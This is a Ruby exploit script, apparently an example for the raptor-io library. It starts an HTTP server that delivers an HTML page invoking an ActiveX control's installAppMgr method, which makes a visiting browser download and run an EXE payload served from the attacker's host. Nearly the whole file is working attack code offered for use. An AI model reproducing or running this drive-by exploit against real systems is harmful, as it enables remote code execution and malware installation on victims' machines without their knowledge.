#!/usr/bin/env ruby
$:.push File.join(File.dirname(__FILE__), "..", "lib")

require 'raptor-io'
require 'optparse'


def build_exe(path)
  exe_contents = ""
  File.open(path, "rb") { |f| exe_contents = f.read }

  exe_contents
end

def exploit_html(lhost, lport)
    %Q|
    <html>
      <object id='test' classid='clsid:3356DB7C-58A7-11D4-AA5C-006097314BF8'></object>
      <script language="javascript">
        test.installAppMgr("http://#{lhost}:#{lport}/test.exe");
      </script>
    </html>
    |
end

options = {}

my_opts = OptionParser.new do |opts|
  opts.banner = "Usage: example.rb [options]"

  opts.on("--exe <EXE_PATH>", "Path with the exe payload") do |exe|
    options[:exe] = exe
  end

  opts.on("--lhost <LHOST>", "Local host address to provide the payload") do |lhost|
    options[:lhost] = lhost
  end

end

my_opts.parse!

unless options[:exe] && File.exist?(options[:exe])
  puts "[!] Please, provide a valid EXE path"
  exit
end

unless options[:lhost]
  puts "[!] Please provide the listening address to get the payload"
  exit
end


http_server =  RaptorIO::Protocol::HTTP::Server.new(switch_board: RaptorIO::Socket::SwitchBoard.new) do |response|
  request = response.request

  if request.url =~ /\.exe$/
    puts "[*] Sending EXE..."
    response.code = 200
    response.headers['Content-Type'] = 'application/octet-stream'
    response.body = build_exe(options[:exe])
  else
    puts "[*] Sending HTML..."
    response.body = exploit_html(options[:lhost], http_server.port)
    response.code = 200
  end
end

http_server.run